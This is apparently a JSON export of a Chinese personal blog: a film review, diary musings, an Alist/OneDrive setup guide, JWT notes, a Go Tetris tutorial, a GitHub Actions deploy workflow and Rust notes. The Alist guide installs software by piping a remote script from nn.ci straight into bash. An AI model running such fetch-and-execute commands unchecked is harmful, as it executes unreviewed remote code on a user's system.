{"posts":[{"title":"再观《放牛班的春天》","text":"小小的观后感有人说，这部电影让人明白了何为师德，何为园丁。 在这所叫做“池塘之底”的辅育院中，以为矮胖的老师和一群顽劣不堪的孩子们却碰撞出了动人的歌声。 在这歌声中隐藏这的是孩子们对世界的渴望。 这部电影，没有高饱和度，也没有宏大的场面，但它却像一部美丽的童话，满是对希望的赞颂。 它多面而又真实，没有一个孩子出生就是邪恶的，打骂和体罚只会令他们的肉体屈服。但在我看来，这些孩子们的调皮行为更像是为了引起他人的注意，而不是怀揣着恶意去伤害他人。 王尔德说，生活在阴沟里，依然有仰望星空的权利。是的，无论你是成年人还是孩童，无论现在是家财万贯还是一贫如洗，即使跌入“池塘之底”，也依然可以找寻自己内心的光明。不得不说，影片主题深刻，一帧帧画面和一句句台词都闪耀着人性的光芒。 希望我也能变得更加温暖，让自己让身边的人变得更好，让生活让世界变得更美。 纸飞机飞出窗口，蓝天下挥舞的小手，童年像一串串鸽子，拍打翅膀，一飞就永不回头","link":"/2022/12/02/01%E6%94%BE%E7%89%9B%E7%8F%AD%E7%9A%84%E6%98%A5%E5%A4%A9/"},{"title":"使用Alist挂载OneDrive网盘","text":"首先白嫖OneDrive的5T云盘申请微软开发者账号申请地址：https://developer.microsoft.com/zh-cn/microsoft-365/dev-program 点击立即加入！ 注册开发者根据指引填写各类资料后注册。 公司的话随便写 设置E5订阅[] 至此，账户就已经拥有为期90天的E5订阅了，并一次性申请了25个用户许可证。 如果你只是自己用，现在已经可以使用”用户名@域.onmicrosoft.com” 和之前设置的密码登录你电脑上的Office了。 获取5T容量[] 保存后OneDrive容量即升级成5T! 续期E5开发者账户自行上网找办法~~ 为Alist先注册一个API[ Web的url是 https://tool.nn.ci/onedrive/callback 下文还会用到 [ 这个就是client secert的值，先保存下来 [ 给api获取读写权限 到这里OneDrive设置已经完成,下面去https://tool.nn.ci/onedrive/request 获取刷新令牌, 莱斯沟~ [ 生成refresh token client_id : 客户端ID client_secret : 客户端密钥 redirect_uri : 重定向URL refresh_token : 刷新令牌 Alist是什么Alist 是一款支持多种存储的目录文件列表程序，支持 web 浏览与 webdav，后端基于gin，前端使用react。 官网地址 官网文档 支持存储类型 本地存储 阿里云盘 OneDrive / Sharepoint 天翼云盘 GoogleDrive 123 云盘 蓝奏云 Alist FTP PikPak 闪电盘 S3 WebDav Teambition（中国，国际） 分秒帧 和彩云 (个人云, 家庭云) Yandex.Disk 百度网盘 夸克网盘 迅雷云盘 部署 安装 curl -fsSL &quot;https://nn.ci/alist.sh&quot; | bash -s install 更新 curl -fsSL &quot;https://nn.ci/alist.sh&quot; | bash -s update 卸载 curl -fsSL &quot;https://nn.ci/alist.sh&quot; | bash -s uninstall 自定义安装路径 123456 # 安装curl -fsSL &quot;https://nn.ci/alist.sh&quot; | bash -s install /home/power # 更新curl -fsSL &quot;https://nn.ci/alist.sh&quot; | bash -s update /home/power # 卸载curl -fsSL &quot;https://nn.ci/alist.sh&quot; | bash -s uninstall /home/power 访问服务脚本部署完成后，Alist默认分配5244端口，密码则会在安装后显示。 1http://YOUR_IP:5244/ 本地目录配置挂载路径：既网盘挂载后路径，可以随意。 地区：选网盘所在地。 客户端ID：client-id 客户端秘钥：client-secret 重定向URI:https://tool.nn.ci/onedrive/callback （不保证时效） 刷新令牌：refresh-token 将这些数据保存后就能看到主页的网盘目录了。 参考 OneDrive | Alist Document (nn.ci)","link":"/2022/11/05/00%E4%BD%BF%E7%94%A8Alist%E6%8C%82%E8%BD%BDOneDrive%E7%BD%91%E7%9B%98/"},{"title":"My-First-Blog","text":"My-First-Blog建一个属于自己的博客是我很早就有的想法，但是一直没能有机会与动力去实现。 真正开始行动是在2022/11/04的晚上，因为那天早上刚挂载了网盘，于是特别有兴致，打算一鼓作气。 然而，我几乎踩遍了所有的坑（或许这是我的天赋吧），最后在各位学长学姐的帮助下顺利上线了我的博客，在这里对那几位学长学姐的帮助表达我由衷的感谢！ 一.对目前生活的些许看法 到了大学怎么说，没有高中那些好朋友在身边玩耍，隐隐约约感到高中班主任所说的：“到大学是孤独的旅途”这句话的合理之处了，但生活还是很充实而美好的！ 搁置了很久的阅读还没开始（2022/11/05 还在读Loita），立个小flag——一个月一本！保证基本的阅读。 希望家里的妹妹有认真学习哈，（其实无所谓傲，毕竟我小学可不是个乖孩子） 又熬夜辣~~ 下次一定 二.小想法多花点时间学学曾经没能接触的知识，总算从高中学习中脱离出来了，高中也玩够了是时候achieve something辣！ 三.还有什么吗？？？？Who knows~","link":"/2022/11/04/04My%20First%20Blog/"},{"title":"About JWT(JSON Web Token)","text":"JSON Web Token(JWT)是目前使用广泛的跨域认证解决方案，苯人因一知半解而错误使用而对此稍稍有所了解。 这玩意是个啥 JSONweb token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。 为什么要有JWT这需要提到基于token的身份认证和传统的session认证的区别 传统的session认证访问网站是使用的http协议本身是无状态的，这就意味着如果用户需要进行身份认证，那么在下一次请求就需要再一次提交认证请求，而服务器必须存储用户登录的信息 这就意味着用户数量过高会使服务器无法承受访问压力 问题 Session: 用户经过我们的应用认证之后，都要在服务端做一次记录，从而分辨用户，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。 扩展性: 用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。 CSRF: 因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。 基于Token的鉴权虽然也是无状态的协议，但是不需要服务端去保留用户的认证信息，从而降低了服务器的压力同时提高了拓展能力 流程 用户使用用户名密码来请求服务器 服务器进行验证用户的信息 服务器通过验证发送给用户一个token 客户端存储token，并在每次请求时附送上这个token值 服务端验证token值，并返回数据 关于JWT格式JWT是由三段信息通过.连接组成的字符串 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ 如何构成第一段被称为头部(header)，第二段被称为载荷(payload)，第三段称为(signature) header这里承载了JWT的元数据，例如 1234{ 'typ': 'JWT', 'alg': 'HS256'} 再对此使用Base64URL进行加密成为以下的样子 1eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 payload顾名思义，它承载了有效信息，除一些私有字段外，JWT官方规定了7个字段可供选用 iss (issuer)：签发人 exp (expiration time)：过期时间 sub (subject)：主题 aud (audience)：受众 nbf (Not Before)：生效时间 iat (Issued At)：签发时间 jti (JWT ID)：编号 不过JWT默认时没有加密的，所以别把密码什么的私密信息写进去(我干过) signaturejwt的第三部分是一个签证信息，这个签证信息由三部分组成： header (base64后的) payload (base64后的) secret 其中的secret是只有服务端才知道，绝对不能泄露，然后使用header中指定的签名算法对其进行加密，以下以SHA256为例 1234HMACSHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) Base64URLBase64 有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。 如何使用一般是在请求头里加入Authorization，并同时加上Bearer标注(直接写query里也有)： 1234567fetch('~~~~', { headers: { 'Authorization': 'Bearer ' + token }}) 总结 由于JSON的通用性，所以JWT可以被很多语言通用 可以在payload中写入一些业务逻辑需要但非敏感的信息 利于传输 不需要在服务端保存信息，易于拓展","link":"/2023/01/27/08-About%20JSON%20Web%20Token/"},{"title":"杂谈01","text":"来点闲话2022/11/23 记 到大学已经3个多月了，emmm其实和我想象中区别不大，没有那么不堪也没有所谓的如此美好，总结一下算是满意吧。 到现在已经结束了期中考，不是很理想也不是很糟糕(主要没像高中一样这么认真，现在真就是全依我性子学了)，还算是过了3个月算是充实的大学生活吧。 原以为我到大学会和以前一样不爱搭理人，不过在期间还是遇见了不少有趣的人们，而且被学长学姐视为“老油条”（笑死，喜欢钻学校空子罢了，不过确实一直挑战防疫底线，kkk)，还是想多认识认识志同道合有趣的灵魂们，大学不能把我自己烂在寝室里嘞。 我认为高中期间我是个容易陷入低沉的家伙，其实就是内耗吧，三年下来没少折磨过自己，多亏了高中同学们的包容，让我多次在焦虑与折磨中感受到他人的善意。高考结束后觉得以前许多事实在是没有意义，但是成长过程中或许这些法难以避免吧，到了现在算是有所改观。我之所以有现在的这样的态度离不开他人对我我关心与善意，在这里对我过去无意伤害过的亲友道个歉，暑假后我发现我从来不是一个人，不论在家还是学校都有人愿意向我伸出援手，所以希望发现身边的善意，并以善意对待他人，前一阵子看到一句话说:脾气好的原因:因为根本不care大部分和事。 可能说的也对吧，虽然有人说人是自私的，也没错，有可能这些乐于帮助他人的人最后没多少收获，但为了得到什么而去帮助他人是否有些太功利了？虽然人确实是复杂，但我相信从好的角度去看待他人与事情能改变自己的心境，高考前我对大多数人都抱有一丝怨气，当时看什么都难受，但是到大学呆了3个月，给足了自己空间，发觉把人想得更好自己才会更舒服。虽然说社会上也充斥着恶意，但我觉得以温和的方式去处置，没必要太有棱角，这样大家都能有自己的空间。有人说我过的太简单，以后会吃亏，但至少目前我觉得无所谓了，简单是我的方式吧。(不善言辞，兴起一写) 至于生活方面，因为高中养成的习惯，想在生活中掺入一些艺术气息，毕竟生活不能太无趣对吧(不喜勿喷，只是我自己喜欢而已)。 以上是浅薄之见，个人想法而已~ 说点倒霉的 多次睡觉发现晒被子没收(记性极差) 长达半个月丢了伞，而且懒得买，一直淋雨，前两天刚下决心重买(好心疼生活费) PS:今天又忘餐厅了。。。 谈谈期待 一直耽搁的阅读计划总算有点起色，不多看看书可不行嘞~ 再匀点时间到有趣的学业上 再瞎学点杂七杂八的技术实现需求(但是找不到需求)~ 想学乐器(天赋没有，也没学费，哇要哭了)~~ 已经实现的 买了马克西姆12月21号的音乐会的场次，还是比较期待的，毕竟可以见到本人诶！ 混进了杭助~~ 没有错过11月8号的月食，好开心嘞！ 晚点再加！出门了~","link":"/2022/11/23/05%E6%9D%82%E8%B0%88_01/"},{"title":"杂谈02","text":"一千零一面镜子我越是逃离却越是靠近你我越是背过脸却越是看见你 我是一座孤岛处在相思之水中四面八方隔绝我通向你 一千零一面镜子转映着你的容颜我从你开始我在你结束 林清玄：不要忘记飞翔的姿势在穿过林间的时候，我觉得麻雀的死亡给我一些启示，我们虽然在尘网中生活，但永远不要失去想飞的心，不要忘记飞翔的姿势。","link":"/2022/11/27/06%E6%9D%82%E8%B0%88_02/"},{"title":"写个TERTRIS","text":"用go写了个TETRIS突发奇想闲来无事情想用go写一个Tertris（俄罗斯方块）玩 上网小小检索了一下，确实有很多可以实现游戏ui的2D引擎，但比较懒，不是很像搞明白怎么去用，所以选择了直接在终端打印出来。 既然想做，那就想想应该如何设计 先看看正版到底长啥样 分析一下： 有个方方的游戏区域（显而易见） 方块会自然下落（这个嘛，没想好怎么处理就设计成直接放置的那种） 一行满了消去一行，然后下落 开始写吧先定义一个游戏结构 123456789101112type Game struct { Board [][]int // 游戏区域 Active [][]int // 还没用上，原来打算用来保存可掉落信息的 Score int Level int}const ( WIDTH = 15 // 区域大小啦 HEIGHT = 20) 第一步当然是初始化了 1234567func BoardInit(g *define.Game) { // 初始化游戏板 g.Board = make([][]int, define.HEIGHT) for i := range g.Board { g.Board[i] = make([]int, define.WIDTH) }} 然后就是打印出游戏区域 1234567891011121314151617181920212223// 打印游戏板func PrintBoard(g *define.Game) { // 这里是在每次出现变动时清除内容 cmd := exec.Command(&quot;cmd&quot;, &quot;/c&quot;, &quot;cls&quot;) cmd.Stdout = os.Stdout cmd.Run() // ... /// for i := range g.Board { fmt.Print(&quot;|&quot;) if i == 4 { fmt.Print(&quot;------------------------------|\\n|&quot;) } for j := range g.Board[i] { if g.Board[i][j] == 0 { // 有方块的话就打印一个矩形 fmt.Print(&quot; &quot;) } else { fmt.Print(&quot;■ &quot;) } } fmt.Printf(&quot;|\\n&quot;) } fmt.Print(&quot;|------------------------------|\\n&quot;)} 就可以看到像这样的输出 然后就应该在上方形成方块了 因为只有7种基本形状，于是为决定直接定义7个基本形状 至于为什么定义为4x4,是因为在游戏中这些方块是可以旋转的，为了简单起见，决定统一定义成4x4的结构，在旋转中只需修改它们的位置就好了 123456789101112131415161718192021222324252627282930313233343536373839404142434445var Tetrominoes = [][][]int{ { {0, 0, 0, 0}, {1, 1, 1, 1}, {0, 0, 0, 0}, {0, 0, 0, 0}, }, { {1, 0, 0, 0}, {1, 1, 1, 0}, {0, 0, 0, 0}, {0, 0, 0, 0}, }, { {0, 0, 1, 0}, {1, 1, 1, 0}, {0, 0, 0, 0}, {0, 0, 0, 0}, }, { {1, 1, 0, 0}, {1, 1, 0, 0}, {0, 0, 0, 0}, {0, 0, 0, 0}, }, { {0, 1, 1, 0}, {1, 1, 0, 0}, {0, 0, 0, 0}, {0, 0, 0, 0}, }, { {1, 1, 1, 0}, {0, 1, 0, 0}, {0, 0, 0, 0}, {0, 0, 0, 0}, }, { {1, 1, 0, 0}, {0, 1, 1, 0}, {0, 0, 0, 0}, {0, 0, 0, 0}, },} 每次获取的方块都是随机的于是 12345678910111213141516171819202122232425262728func RandomTetromino() [][]int { // 对随机数生成器进行种子随机化 rand.Seed(time.Now().UnixNano()) // 从Tetrominoes数组中随机选择一个形状 shape := define.Tetrominoes[rand.Intn(len(define.Tetrominoes))] // 复制所选形状的矩阵到游戏板里 tetromino := make([][]int, len(shape)) for i := range shape { tetromino[i] = make([]int, len(shape[i])) copy(tetromino[i], shape[i]) } return tetromino}func NewTetrominoIn(g *define.Game) { // 生成新的俄罗斯方块 nextTetromino := RandomTetromino() for i := range nextTetromino { for j := range nextTetromino[i] { if nextTetromino[i][j] == 1 { g.Board[i][j] = 1 } } }} 就可以打印出类似于这样的界面 至于移动或旋转就很简单了，只需找到生成的方块再作相应处理就好了，这里就不贴出代码了。 下面处理消去一行的操作 其实就是每次遍历一下 1234567891011121314151617181920212223func ClearFullRows(g *define.Game) { // ... // flag := true for y := define.HEIGHT - 1; y &gt;= 0; y-- { flag = true for x := 0; x &lt; define.WIDTH; x++ { if g.Board[y][x] == 0 { flag = false break } } if flag { // 去除被消去的行 for x := 0; x &lt; define.WIDTH; x++ { g.Board[y][x] = 0 } // ... // } }} 这时候就有了个问题 如何下落？ 首先，相互连接的方块是不可以掉到底部的 消去的不一定是下一行 所有相连的方块是一个整体 那这有有点头疼了，首先就是如何找到掉落方块整体，然后如何确定掉落高度 那就先处理如何找到掉落方块整体区间由于只需要确定最小下落值，所以只用确定方块的左右范围就好了，但如何区查找呢？ 因为整体说明这些方块左右上下想连，所以可以使用DFS算法去查找! 这里格外传入了i和j两个值代表开始检索的左下角，因为只有在清除行上的部分才会发生掉落，所以要传入坐标以确定起始位置 而传入的left和right就修改为得到的数值而继续使用 12345678910111213141516171819202122func Dfs(grid [][]int, i int, j int, visited [][]bool, left *int, right *int) { // 检查当前位置是否已经被访问过，或者是否为0 if i &lt; 0 || i &gt;= len(grid) || j &lt; 0 || j &gt;= len(grid[0]) || grid[i][j] == 0 || visited[i][j] { return } // 将当前位置标记为已访问 visited[i][j] = true // 更新左右边界 if *left &gt; j { *left = j } if *right &lt; j { *right = j } // 递归遍历相邻的位置 Dfs(grid, i-1, j, visited, left, right) // 上 Dfs(grid, i+1, j, visited, left, right) // 下 Dfs(grid, i, j-1, visited, left, right) // 左 Dfs(grid, i, j+1, visited, left, right) // 右} 关于掉落块的掉落高度emmm好像没啥好分析的，直接给出代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// 从左往右查找，这个方法比较蠢// startLine 代表的是被消去的那一行// 详细代码在仓库里func Drop(g *define.Game, startLine int) { column := 0 for column &lt; define.WIDTH { // 左右开始是重合的 left, right := column, column for y := startLine; y &gt;= 5; y-- { // 找到第一个方块，然后进行搜索 if g.Board[y][column] == 1 { visited := make([][]bool, len(g.Board)) for i := range visited { visited[i] = make([]bool, len(g.Board[i])) } // 通过Dfs查找范围 utils.Dfs(g.Board, y, column, visited, &amp;left, &amp;right) break } } var dropHeight int = 999 top := startLine for i := left; i &lt;= right; i++ { for y := startLine; y &gt;= 0; y-- { if g.Board[y][i] == 1 { top = y break } } for y := top + 1; y &lt;= define.HEIGHT; y++ { if y == define.HEIGHT || g.Board[y][i] == 1 { if dropHeight &gt; y-top-1 { dropHeight = y - top - 1 } break } } } // 获取了掉落高度，将范围内的下移 for i := left; i &lt;= right; i++ { for y := top; y &gt;= 5; y-- { g.Board[y+dropHeight][i] = g.Board[y][i] g.Board[y][i] = 0 } } column = right + 1 }} 运行例子，可能一定还有一堆bug，不过能跑就好 这是我的代码仓库，还有许多不足，望日后逐步修正","link":"/2023/03/16/09-%E7%94%A8go%E5%86%99%E4%BA%86%E4%B8%AATETRIS/"},{"title":"使用Github Action实现Hexo博客自动部署","text":"缘由一天在课上当我准备上传我的Hexo静态博客，但意外的报了个莫名其妙的错，表示无法连接到服务器。当时问了问群u，等我解决后，发现一位群u提到了可以用Github Action触发服务器自动拉取，我也意识到每次都全部上传一遍确实有点烦人，于是我有打算来试试水。 什么是Github Action GitHub Actions 是一种持续集成和持续交付 (CI/CD) 平台，可用于自动执行生成、测试和部署管道。 您可以创建工作流程来构建和测试存储库的每个拉取请求，或将合并的拉取请求部署到生产环境。(这么长看都懒得看) 简单地说，Github Action 提供了 Linux、Windows 和 macOS 虚拟机，用户可以自定义脚本，当检测到特定事件发生是就会执行相应的脚本。 下回有时间写一篇博客详细说说吧。 思路我的想法是当我在本地生成页面后，将页面push到Github的仓库中，同时触发Action，让服务器端自动pull页面，实现博客的部署。 服务器端的配置既然我需要服务器端自动pull我的页面，那么服务器必须安装git，这个应该不用多说。 1234$ apt-git install git$ // 生成你的key，再去github填上$ cd /path$ git clone yourUrl 不过因为我的博客之前是部署在/var/www/html下的，然后我也懒得改，于是在clone后就把文件夹直接改了个名。 Github Action回顾一下想法，首先是在push的时候触发，然后服务器自动pull页面。 创建一个Action点击仓库中的Actions 选择创建一个新的workflow 直接自己创建一个 然后就可以看到一个编辑脚本的界面，我把它重命名为了deply.yml，接下去稍稍解释一下。 这里是定义变量的地方： 12345678910111213141516171819name: deplyon: push: // 发生push操作时候执行 branches: - master // 在哪个分支上jobs: deply: name: auto delpy runs-on: ubuntu-latest steps: - name: clone pages uses: appleboy/ssh-action@master with: // 这几个变量可以在action中自己设置 host: ${{ secrets.HOST }} // 服务器地址 username: ${{ secrets.USER }} // 用户名 password: ${{ secrets.PASSWD }} // 密码 script: cd /var/www/html &amp;&amp; git pull // 在服务器端的执行的脚本 这里的意思是当我push到master分支后，会通过github在HOST上执行脚本，从而实现自动clone的操作。 接下去每当你push一次你的界面，过一会会你就会发现你的博客页面已经更新了。","link":"/2023/04/12/12%E5%8D%9A%E5%AE%A2%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/"},{"title":"Rust-note-01变量与可变性","text":"变量与可变性 声明变量用let关键字 默认下是不可变（Immutable） 可以加入mut，使变量可变 变量与常量 常量（constant）,常量在绑定值后也是不可变，但是有许多不同： 不可使用mut，常量永远不可变 声明常量使用const关键字，且类型必须被标注 常量可以在任何作用域中被声明 Shadowing 可以使用相同的名字声明新的变量，新的变量会被shadow之前声明的同名变量 在后续代码中，这个名字代表的就是新的变量","link":"/2022/12/04/07-RUST/07-RUST01%E5%8F%98%E9%87%8F%E4%B8%8E%E5%8F%AF%E5%8F%98%E6%80%A7/"},{"title":"Rust-note-02数据类型","text":"数据类型 标量和复合类型 Rust是静态编译语言，在编译的同时必须知道所有变量的类型 基于使用的值，编译器通常能够推断出它的具体类型 但如果可能的类型太多（例如将string转换为整数的parse方法），就必须添加类型的标注 标量类型 一个标量代表一个单一的值 Rust有四个主要的标量类型： 整数类型 浮点类型 布尔类型 字符类型 整数类型 就是个整数 例如u32是一个无符号整数类型，占据32位空间 无符号用u开头 浮点类型 Rust有两种基础的浮点类型 f32 f64 Rust的浮点类型使用了IEEE-754标注来表述 f64是默认类型，因为在现代CPU上f64和f32速度差不多，且精度更高 布尔类型 true 和 false 两个值 一个字节 符号是bool 字符类型 Rust中的char类型用来表示最基础的单个字符 字符类型的字面值使用单引号 占用4个字节 使用Unicode编码 复合类型 Tuple 可以使用模式匹配来解构一个Tuple来获取值 12345fn main() { let tup: (i32, f64, u8) = (500, 6.4, 1); let (x, y, z) = tup; println!(&quot;{}, {}, {}&quot;, x, y, z);} 访问Tuple的元素 在Tuple变量使用点标记，后接元素索引 1234fn main() { let tup: (i32, f64, u8) = (500, 6.4, 1); println!(&quot;{}, {}, {}&quot;, tup.0, tup.1, tup.2);} 数组 声明方法：在一个中括号中，各值用逗号分隔 数组的用处 如果想让数据存放在stack中而不是heap上，或者想保证有固定数量的元素，这时使用数组更有好处 数组没有Vector灵活 Vector和数组类似，它由标准库提供 Vector的长度可以改变 数组的类型 数组的类型可以以这种形式表示：[类型; 长度]- let a[i32;5] = [1,2,3,4,5]; 另一种声明数组的方法 如果数组的每个元素值都相同，那么可以在： 在中括号中指定初始值 然后是一个 ; 最后是数组长度 let a[3;5]; 等价于 let a = [3,3,3,3,3]; 访问数组的元素 数组是Stack上分配的单个块的内存 可以使用索引 123456789101112131415161718fn main() { let months = [ &quot;Jan&quot;, &quot;Feb&quot;, &quot;Mar&quot;, &quot;Apr&quot;, &quot;May&quot;, &quot;Jun&quot;, &quot;Jul&quot;, &quot;Aug&quot;, &quot;Sep&quot;, &quot;Oct&quot;, &quot;Nov&quot;, &quot;Dec&quot; ]; let first = months[0]; let second = months[1];} 如果访问的索引超出了数组的范围，那么： 编译会通过 运行保存（runtime时panic） Rust不会允许其访问相应地址的内存","link":"/2022/12/04/07-RUST/07-RUST02%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"},{"title":"Rust-note-03函数","text":"Rust 函数基本形式 fn &lt;函数名&gt; ( &lt;参数&gt; ) &lt;函数体&gt; 函数参数12345678fn main(){ another_function(5, 6);}fn another_function(x: i32, y: i32) { println!(&quot;x 的值为 : {}&quot;, x); println!(&quot;y 的值为 : {}&quot;, y);} x 的值为 : 5y 的值为 : 6 函数体的语句与表达式Rust 的函数体由以表达式(expression)结尾的语句(statement)组成 123456789101112fn main() { let x = 5; let y = { let x = 3; x + 1 // 这是一个表达式，它的值是整个函数的的结果值 // 被叫做函数体表达式(后面不能有;有的话就是一条statement) }; println!(&quot;x 的值为 : {}&quot;, x); println!(&quot;y 的值为 : {}&quot;, y);} x 的值为 : 5y 的值为 : 4 函数的返回值 在-&gt;符号后面声明函数的返回值类型，但不可为返回值命名 在Rust中，返回值是函数体中最后一个表达式的值 若需要提前返回，使用return关键字，并指定一个值 大部分函数都是默认使用最后一个表达式作为返回的值 123fn five() -&gt; i32 { 5 //返回值就是5}","link":"/2022/12/04/07-RUST/07-RUST03%E5%87%BD%E6%95%B0%E4%B8%8E%E6%B3%A8%E9%87%8A/"},{"title":"Rust-note-05切片","text":"一.Rust Slice切片（Slice）是对数据值的部分引用。 字符串切片12345678fn main() { let s = String::from(&quot;broadcast&quot;); let part1 = &amp;s[0..5]; let part2 = &amp;s[5..9]; println!(&quot;{}={}+{}&quot;, s, part1, part2);} broadcast=broad+cast x..y == [x,y) ..y 等价于 0..yx.. 等价于位置 x 到数据结束.. 等价于位置 0 到结束 非字符串切片1234567fn main() { let arr = [1, 3, 5, 7, 9]; let part = &amp;arr[0..3]; for i in part.iter() { println!(&quot;{}&quot;, i); }} 1 2 3","link":"/2022/12/04/07-RUST/07-RUST05%E5%88%87%E7%89%87/"},{"title":"Rust-note-04所有权","text":"一.什么是所有权 Rust的核心特性是所有权 所有程序在运行是必须管理它们使用内存的方式 有些语言有垃圾收集机制，在运行是，会自动去寻找不再使用的内存 其他语言中，必须手动地分配和释放内存 Rust使用了第三种方式 内存通过一个所有权系统来管理，其中包含一组编译器在编译时检查的规则 所以当程序运行是，所有权特性不会拖慢程序的运行速度 Stack &amp; Heap 在Rust这样的系统级编程语言中，一个值是在stack还是再heap上对程序的行为和如何做决定有很大的影响 Stack stack 按值的接受顺序来存储,按相反的顺序移除(LIFO) push pop 所有存在stack上的数据必须有已知且固定的大小 编译时未知大小的数据或是运行时大小可能发生改变的数据必须存储在heap上 Heap 将数据存入 heap 时，会请求一定空间 系统在 heap 中找到一块足够大的空间时，将它标记为在用，并返回一个指针 存储数据 将值压入 stack 不叫分配 因为指针是已知固定大小，可以把指针放在 stack 上 想要实际数据可以使用指针来定位 将数据压入 stack 比从 heap 中分配要快得多： 因为系统无需寻找空间，只需要压入顶部 访问数据 访问 heap 要比访问 stack 慢得多，因为要通过指针才能找到 heap 中的数据 对于现代计算机，由于缓存的存在，指令在内存中跳转得越少，那么速度越快 函数的调用 调用函数时，值被传入到函数(包括指向 heap 的指针)。函数的变量压入 stack 中。函数结束后，这些值会被弹出 所有权存在的原因 所有权解决了什么？ 跟踪代码那些部分在使用 heap 的那些数据 最小化 heap 中的重复数据 清理 heap 上未使用的数据 所有权的规则 每个值都有一个变量，这个变量是该值的所有者 每个值同时只能有一个所有者 所有者超出作用域后，这个值会被删除 二.内存与分配 Rust 采用了不同的方式：对于某个值来说，当拥有它的变量走出作用域的时候，内存自动还给操作系统 drop 函数 变量和数据交互的方式：Move 多个变量可以与同一个数据使用一种独特的方式来交互12let x = 5;let y = x; 整数是已知大小且固定大小的值，这两个5都被压入 stack 中 变量和数据交互的方式：Move(String) 一个 string 由三部分组成： 指针 长度 容量 123let s1 = String::from(&quot;hello&quot;);let s2 = s1;println!(&quot;{}, world!&quot;, s1); 将 s1 赋给 s2 时，将数据复制了一份： 在 stack 上复制了一份（指针 长度 容量） 但是没有复制 heap 上的数据 离开作用域后，会调用drop函数，将heap中的内存释放 当 s1、s2 都离开时，它们会尝试去释放相同的内存： 二次释放(double free) 为了保证内存安全： Rust 没有选择复制被分配的内存 Rust 使 s1 失效 所以 s1 离开作用域的时候无需释放任何内存 如果尝试使用 s1 会有以下错误 浅拷贝(shallow copy) 深拷贝(deep copy) 由于 Rust 让 s1 失效，所以使用新的术语：移动(Move) 隐含的一个原则：Rust 不会自动创建数据的深拷贝 就运行性能而言，任何自动赋值的操作都是廉价的 克隆(clone)如果想要 s1，s2 均有效，可以使用 clone方法(深度拷贝) 123let s1 = String::from(&quot;hello&quot;);let s2 = s1.clone();println!(&quot;{}, world!&quot;, s1); stack上：复制123let x = 5;let y = x;println!(&quot;x = {}, y = {}&quot;, x, y); Copy trait 可以用于想整数这样完全存放在 stack 上的类型 如果一个类型实现了 copy 这个 tarit ，那么旧的变量在赋值后仍然可用 如果一个类型或者该类型的一部分实现了 drop trait ，那么Rust不允许它再去实现 copy tarit 拥有 copy trait的类型 任何简单标量的组合类型都可copy 需要分配资源的不可copy 有 copy tarit 的类型 所有整数 bool char float Tuple(如果所有字段可copy) 三.涉及函数的所有权机制 对于变量而言函数的所有权问题显得非常奇怪 函数参数的所有权机制123456789101112131415161718192021222324252627fn main() { let s = String::from(&quot;hello&quot;); // s 被声明有效 takes_ownership(s); // s 的值被当作参数传入函数 // 所以可以当作 s 已经被移动，从这里开始已经无效 let x = 5; // x 被声明有效 makes_copy(x); // x 的值被当作参数传入函数 // 但 x 是基本类型，依然有效 // 在这里依然可以使用 x 却不能使用 s} // 函数结束, x 无效, 然后是 s. 但 s 已被移动, 所以不用被释放fn takes_ownership(some_string: String) { // 一个 String 参数 some_string 传入，有效 println!(&quot;{}&quot;, some_string);} // 函数结束, 参数 some_string 在这里释放fn makes_copy(some_integer: i32) { // 一个 i32 参数 some_integer 传入，有效 println!(&quot;{}&quot;, some_integer);} // 函数结束, 参数 some_integer 是基本类型, 无需释放 如果将变量作为参数传入函数，那么它和移动的效果是一样的 函数返回值的所有权机制 被当作函数返回值的变量所有权将会被移动出函数并返回到调用函数的地方，而不会直接被无效释放。 123456789101112131415161718192021222324fn main() { let s1 = gives_ownership(); // gives_ownership 移动它的返回值到 s1 let s2 = String::from(&quot;hello&quot;); // s2 被声明有效 let s3 = takes_and_gives_back(s2); // s2 被当作参数移动, s3 获得返回值所有权} // s3 无效被释放, s2 被移动, s1 无效被释放.fn gives_ownership() -&gt; String { let some_string = String::from(&quot;hello&quot;); // some_string 被声明有效 return some_string; // some_string 被当作返回值移动出函数}fn takes_and_gives_back(a_string: String) -&gt; String { // a_string 被声明有效 a_string // a_string 被当作返回值移出函数} 四.引用与租借引用与租借简单解释 引用（Reference）是 C++ 开发者较为熟悉的概念。如果你熟悉指针的概念，你可以把它看作一种指针。实质上”引用”是变量的间接访问方式。 例子： 12345fn main() { let s1 = String::from(&quot;hello&quot;); let s2 = &amp;s1; println!(&quot;s1 is {}, s2 is {}&quot;, s1, s2);} 运行结果: s1 is hello, s2 is hello &amp; 运算符可以取变量的”引用”。 当一个变量的值被引用时，变量本身不会被认定无效。因为”引用”并没有在栈中复制变量的值： 函数参数传递的道理相同: 123456789fn main() { let s1 = String::from(&quot;hello&quot;); let len = calculate_length(&amp;s1); println!(&quot;The length of '{}' is {}.&quot;, s1, len);}fn calculate_length(s: &amp;String) -&gt; usize { s.len()} The length of ‘hello’ is 5. 参数类型是 &amp;String 而不是 String &amp; 符号表示引用：允许你引用某些值而不取得所有权 引用本身也是一个类型并具有一个值，这个值记录的是别的值所在的位置，但引用不具有所指值的所有权： 